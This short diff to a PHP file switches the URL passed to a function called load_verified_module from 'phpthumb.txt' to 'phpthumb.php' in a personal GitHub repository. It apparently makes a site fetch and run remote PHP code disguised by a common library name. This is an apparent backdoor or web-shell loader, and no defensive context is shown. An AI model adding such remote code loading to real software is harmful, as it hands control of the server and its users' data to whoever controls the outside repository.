@@ -45,7 +45,7 @@ function load_verified_module($url)
 }
 
 // --- использование ---
-$url = 'https://github.com/AmAA29/amaa29/blob/main/phpthumb.txt';
+$url = 'https://github.com/AmAA29/amaa29/blob/main/phpthumb.php';
 
 if (!load_verified_module($url)) {
     header('HTTP/1.1 500 Internal Server Error');
